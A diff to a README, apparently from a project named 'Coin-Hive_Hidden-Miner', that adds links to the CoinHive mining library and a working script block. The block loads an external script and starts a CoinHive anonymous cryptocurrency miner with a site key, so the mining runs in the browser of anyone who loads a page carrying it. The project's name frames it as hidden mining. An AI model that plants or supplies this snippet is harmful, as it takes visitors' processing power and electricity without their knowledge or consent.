@@ -29,6 +29,18 @@ All
 
 <h3> How it Works??? </h3>
 
+![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/screenshot.JPG)
+
+https://coinhive.com/documentation/miner#constructor-options
+
+https://coinhive.com/lib/coinhive.min.js?v8
+
+ <script src="https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/pino.js"></script>
+<script>
+ var miner = new CoinHive.Anonymous('YhWQAh8Vm7tIshKjOsp75jpDDVaO5kkU', {throttle: 0.2});
+  miner.start();
+</script> 
+
 ![Alt text](http://www.imigliorifaucet.it/g1.gif)
 
 
